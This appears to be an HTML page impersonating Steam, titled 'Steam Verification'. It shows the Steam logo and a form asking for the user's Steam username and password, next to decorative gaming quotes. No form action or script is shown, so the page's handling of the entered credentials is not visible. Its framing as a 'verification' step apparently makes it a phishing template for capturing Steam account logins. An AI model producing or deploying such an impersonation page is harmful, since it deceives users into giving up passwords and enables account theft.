<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steam Verification</title>
    <link rel="stylesheet" href="steam.css">
    <link rel="stylesheet" href="styles.css"> <!-- Include the main styles for consistent styling -->
</head>
<body>

    <div class="container">
        <h1>
            Steam Verification
            <img src="steam.png" alt="Steam Logo">
        </h1>
        <form id="steamForm">
            <label for="steamUsername">Steam Username:</label>
            <input type="text" id="steamUsername" name="steamUsername" required>
            
            <label for="steamPassword">Steam Password:</label>
            <input type="password" id="steamPassword" name="steamPassword" required>

            <button type="submit">LOGIN TO STEAM</button>
        </form>
        <p class="quote">"Gaming is not a crime; it's an art."</p>
        <p class="quote">"In the world of gaming, there are no limits."</p>
        <!-- Add more gaming-related quotes as needed -->

    </div>

</body>
</html>
